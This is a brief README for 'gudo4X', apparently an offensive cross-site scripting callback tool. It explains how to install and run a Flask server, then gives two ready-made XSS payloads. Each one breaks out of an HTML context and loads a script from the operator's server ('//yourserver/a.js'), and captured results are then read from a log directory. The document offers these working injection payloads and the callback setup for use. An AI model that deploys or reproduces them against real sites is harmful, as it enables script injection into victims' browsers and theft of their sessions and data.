## gudo4X - guide dog for xss

### dependencies
* install flask and magic

```bash
sudo apt update && sudo apt install -y python3-flask python3-magic
```

* (for https) put cert files in project directory (cert.pem, key.pem)

### running

```bash
sudo bash start.sh start &
```

* send the script in a xss:
```html
'"><script/src=//yourserver/a.js></script><"'
```

```html
'"><svg/onload=body.appendChild(createElement`script`).src="//yourserver/a.js"><"'
```

* see the log directory

### clean logs
```bash
sudo bash run.sh clean
```
### todo
- send basic info together
- reorganize log files
- good service management
- http and https 
- http authentication
